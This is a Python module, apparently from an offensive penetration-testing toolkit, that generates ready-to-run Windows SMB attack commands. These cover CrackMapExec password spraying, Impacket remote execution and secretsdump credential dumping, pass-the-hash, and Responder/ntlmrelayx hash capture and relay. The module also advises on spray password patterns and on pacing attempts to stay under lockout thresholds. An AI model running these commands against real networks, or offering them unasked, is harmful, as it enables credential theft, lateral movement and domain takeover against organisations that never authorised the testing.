"""
AIPTX Beast Mode - SMB Credential Spraying
==========================================

SMB-specific credential spraying and access validation.
"""

from __future__ import annotations

import logging
from dataclasses import dataclass, field
from typing import Any

logger = logging.getLogger(__name__)


@dataclass
class SMBSprayResult:
    """Result of SMB spray attempt."""
    target: str
    username: str
    password: str
    success: bool
    admin_access: bool = False
    shares: list[str] = field(default_factory=list)
    message: str = ""
    error: str | None = None


class SMBSprayer:
    """
    SMB-specific credential spraying.

    Provides detailed SMB authentication testing with
    share enumeration and admin access validation.
    """

    def __init__(self, domain: str | None = None):
        """
        Initialize SMB sprayer.

        Args:
            domain: Windows domain name
        """
        self.domain = domain
        self._results: list[SMBSprayResult] = []

    def get_cme_spray_command(
        self,
        target: str,
        usernames: list[str],
        password: str,
        check_admin: bool = True,
    ) -> dict[str, str]:
        """
        Get CrackMapExec SMB spray command.

        Args:
            target: Target IP or range
            usernames: List of usernames
            password: Password to spray
            check_admin: Check for admin access

        Returns:
            Command configuration
        """
        user_str = " ".join(f"'{u}'" for u in usernames)
        domain_opt = f"-d {self.domain}" if self.domain else ""

        cmd = f"crackmapexec smb {target} -u {user_str} -p '{password}' {domain_opt} --continue-on-success"

        return {
            "command": cmd,
            "description": f"CME SMB spray with password: {password[:3]}***",
            "success_indicators": ["[+]", "Pwn3d!"],
            "admin_indicator": "Pwn3d!",
            "notes": "[+] = valid creds, Pwn3d! = local admin",
        }

    def get_impacket_commands(
        self,
        target: str,
        username: str,
        password: str,
    ) -> list[dict[str, str]]:
        """
        Get Impacket-based SMB commands.

        Args:
            target: Target IP
            username: Username
            password: Password

        Returns:
            List of Impacket commands
        """
        cred_str = f"{self.domain}/{username}:{password}" if self.domain else f"{username}:{password}"

        return [
            {
                "name": "smbclient",
                "command": f"impacket-smbclient {cred_str}@{target}",
                "description": "Interactive SMB client",
            },
            {
                "name": "psexec",
                "command": f"impacket-psexec {cred_str}@{target}",
                "description": "PsExec-style remote execution",
                "requires_admin": True,
            },
            {
                "name": "wmiexec",
                "command": f"impacket-wmiexec {cred_str}@{target}",
                "description": "WMI-based execution",
                "requires_admin": True,
            },
            {
                "name": "smbexec",
                "command": f"impacket-smbexec {cred_str}@{target}",
                "description": "SMB-based execution",
                "requires_admin": True,
            },
            {
                "name": "atexec",
                "command": f"impacket-atexec {cred_str}@{target} 'whoami'",
                "description": "Task Scheduler execution",
                "requires_admin": True,
            },
            {
                "name": "secretsdump",
                "command": f"impacket-secretsdump {cred_str}@{target}",
                "description": "Dump secrets (SAM, LSA, NTDS)",
                "requires_admin": True,
            },
        ]

    def get_share_enum_commands(
        self,
        target: str,
        username: str | None = None,
        password: str | None = None,
    ) -> list[dict[str, str]]:
        """
        Get SMB share enumeration commands.

        Args:
            target: Target IP
            username: Optional username
            password: Optional password

        Returns:
            List of share enum commands
        """
        commands = []

        # Anonymous enumeration
        commands.append({
            "name": "smbclient_anon",
            "command": f"smbclient -L //{target} -N",
            "description": "List shares anonymously",
        })

        commands.append({
            "name": "smbmap_anon",
            "command": f"smbmap -H {target}",
            "description": "Map shares with permissions",
        })

        # Authenticated enumeration
        if username and password:
            cred_str = f"{self.domain}\\{username}" if self.domain else username

            commands.extend([
                {
                    "name": "smbclient_auth",
                    "command": f"smbclient -L //{target} -U '{cred_str}%{password}'",
                    "description": "List shares with creds",
                },
                {
                    "name": "smbmap_auth",
                    "command": f"smbmap -H {target} -u '{username}' -p '{password}' -d '{self.domain or '.'}'",
                    "description": "Map shares with permissions",
                },
                {
                    "name": "cme_shares",
                    "command": f"crackmapexec smb {target} -u '{username}' -p '{password}' --shares",
                    "description": "CME share enumeration",
                },
            ])

        return commands

    def get_pass_the_hash_commands(
        self,
        target: str,
        username: str,
        ntlm_hash: str,
    ) -> list[dict[str, str]]:
        """
        Get pass-the-hash commands.

        Args:
            target: Target IP
            username: Username
            ntlm_hash: NTLM hash (LM:NT or just NT)

        Returns:
            List of PTH commands
        """
        cred_str = f"{self.domain}/{username}" if self.domain else username

        # Ensure hash is in correct format
        if ":" not in ntlm_hash:
            ntlm_hash = f"aad3b435b51404eeaad3b435b51404ee:{ntlm_hash}"

        return [
            {
                "name": "cme_pth",
                "command": f"crackmapexec smb {target} -u '{username}' -H '{ntlm_hash}' -d '{self.domain or '.'}'",
                "description": "CME pass-the-hash",
            },
            {
                "name": "psexec_pth",
                "command": f"impacket-psexec -hashes '{ntlm_hash}' {cred_str}@{target}",
                "description": "PsExec with hash",
            },
            {
                "name": "wmiexec_pth",
                "command": f"impacket-wmiexec -hashes '{ntlm_hash}' {cred_str}@{target}",
                "description": "WMI with hash",
            },
            {
                "name": "smbexec_pth",
                "command": f"impacket-smbexec -hashes '{ntlm_hash}' {cred_str}@{target}",
                "description": "SMB exec with hash",
            },
            {
                "name": "secretsdump_pth",
                "command": f"impacket-secretsdump -hashes '{ntlm_hash}' {cred_str}@{target}",
                "description": "Dump secrets with hash",
            },
            {
                "name": "evil_winrm_pth",
                "command": f"evil-winrm -i {target} -u '{username}' -H '{ntlm_hash.split(':')[1]}'",
                "description": "WinRM with hash",
            },
        ]

    def get_relay_commands(
        self,
        listen_interface: str = "0.0.0.0",
        targets_file: str = "/tmp/targets.txt",
    ) -> list[dict[str, str]]:
        """
        Get SMB relay attack commands.

        Args:
            listen_interface: Interface to listen on
            targets_file: File with target hosts

        Returns:
            SMB relay commands
        """
        return [
            {
                "name": "responder",
                "command": f"responder -I {listen_interface} -wrf",
                "description": "Start Responder for hash capture",
                "notes": "Captures NTLM hashes from network",
            },
            {
                "name": "ntlmrelayx",
                "command": f"impacket-ntlmrelayx -tf {targets_file} -smb2support",
                "description": "Relay captured hashes",
                "notes": f"Put target IPs in {targets_file}",
            },
            {
                "name": "ntlmrelayx_socks",
                "command": f"impacket-ntlmrelayx -tf {targets_file} -smb2support -socks",
                "description": "Relay with SOCKS proxy",
                "notes": "Use proxychains with localhost:1080",
            },
            {
                "name": "ntlmrelayx_exec",
                "command": f"impacket-ntlmrelayx -tf {targets_file} -smb2support -c 'whoami'",
                "description": "Relay with command execution",
            },
            {
                "name": "ntlmrelayx_secretsdump",
                "command": f"impacket-ntlmrelayx -tf {targets_file} -smb2support --dump-secrets",
                "description": "Relay and dump secrets",
            },
        ]

    def get_spray_wordlist_recommendations(self) -> dict[str, Any]:
        """Get recommendations for spray wordlists."""
        return {
            "username_sources": [
                "LDAP enumeration: ldapsearch -x -H ldap://DC -b 'DC=domain,DC=com' '(objectClass=user)' sAMAccountName",
                "SMB RID brute: crackmapexec smb DC -u '' -p '' --rid-brute",
                "Kerbrute user enum: kerbrute userenum -d domain.com users.txt",
                "OSINT: LinkedIn, company website, email patterns",
            ],
            "password_patterns": [
                "<Season><Year> - Spring2024, Summer2024!",
                "<Company><Number> - Acme123, Acme2024",
                "Welcome<Number> - Welcome1, Welcome123",
                "Password<Number> - Password1, P@ssw0rd",
                "<City><Number> - based on company location",
            ],
            "timing": {
                "safe_attempts": 3,
                "lockout_threshold": 5,
                "observation_window": "30 minutes typically",
                "reset_time": "30-60 minutes typically",
            },
        }


__all__ = [
    "SMBSprayResult",
    "SMBSprayer",
]
